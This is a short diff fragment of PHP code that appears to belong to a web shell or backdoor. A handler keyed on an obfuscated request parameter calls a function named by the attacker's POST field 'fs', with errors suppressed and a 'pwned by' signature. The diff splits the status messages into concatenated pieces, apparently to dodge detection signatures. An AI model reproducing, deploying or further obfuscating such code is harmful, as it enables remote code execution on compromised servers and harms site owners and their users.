@@ -146,10 +146,10 @@ if(isset($_REQUEST['_vn'.'n_da'.'ta_'])){
 			$failed=($_POST['fs']($panel)==0);
 		}
 		if($failed){
-			echo ('Oh men!');
+			echo ('O'.'h m'.'en!');
 			@(he.he.pow.ned.by.vi.nh.ja.xt());
 		}else{
-			echo ('OK men!');
+			echo ('O'.'K m'.'en!');
 			@(he.he.pow.ned.by.vi.nh.ja.xt());
 		}
 	} # end of function _get_vn n_da ta_
